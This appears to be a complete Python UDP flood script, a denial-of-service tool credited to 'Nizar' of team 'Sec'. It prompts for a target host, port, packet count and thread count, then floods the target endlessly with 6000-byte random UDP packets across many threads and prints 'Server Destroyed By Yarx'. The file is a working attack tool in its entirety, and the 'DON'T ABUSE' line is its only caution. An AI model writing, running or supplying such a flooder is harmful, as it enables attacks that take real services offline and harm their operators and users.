#!/usr/bin/env python3
#RENAME = DELETE
#semoga harimu menyenangkan

import random
import socket
import threading
import os
os.system("clear")
print("AUTHOR : Nizar")
print("CREDIT : Nizar")
print("TEAM : Sec")
print("From : Indonesia")
print("DON'T ABUSE")
ip = str(input(" Ip/Host : "))
port = int(input(" Port Target : "))
times = int(input(" Paket :"))
threads = int(input(" Threads :"))

def run():
  data = random._urandom(6000)
  i = random.choice(("[*]","[!]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(data,addr)
      print(i +" Yarx")
    except:
      print("Server Destroyed By Yarx")

for y in range(threads):
    th = threading.Thread(target = run)
    th.start()
